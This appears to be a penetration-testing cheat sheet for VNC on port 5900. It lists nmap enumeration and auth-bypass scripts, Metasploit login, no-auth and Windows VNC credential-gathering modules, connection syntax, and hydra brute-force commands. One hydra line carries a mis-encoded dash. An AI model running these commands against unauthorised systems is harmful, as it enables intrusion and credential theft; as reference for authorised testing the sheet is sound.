# 5900 (VNC)

## Checks

* [ ] Check for easy VNC passwords
* [ ] Check for exploits for VNC version
* [ ] Brute force VNC password

## Enumeration

### nmap

```bash
nmap -sV -Pn -p 5900 --script=vnc-info,vnc-title,realvnc-auth-bypass <IP> -oA 5900_nmap_VNC
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900,5800 <IP>
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> <IP>
```

### Metasploit

#### Login Scan

```bash
use auxiliary/scanner/vnc/vnc_login
set rhosts <IP>
run
```

#### No-auth Scan

```bash
use auxiliary/scanner/vnc/vnc_none_auth
set rhosts <IP>
run
```

#### Post exploit module

```bash
background
use post/windows/gather/credentials/vnc
set session X
exploit

vncviewer 192.168.1.109
```

## Connection

```bash
vncviewer [-passwd passwd.txt] <IP>::5901
vncviewer <IP>:<PORT>
```

## Brute Force

```bash
hydra -s 5900 -P /usr/share/seclists/Passwords/darkweb2017-top10.txt -t 30 <IP> vnc
hydra -L <USERS_LIST> â€“P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
```
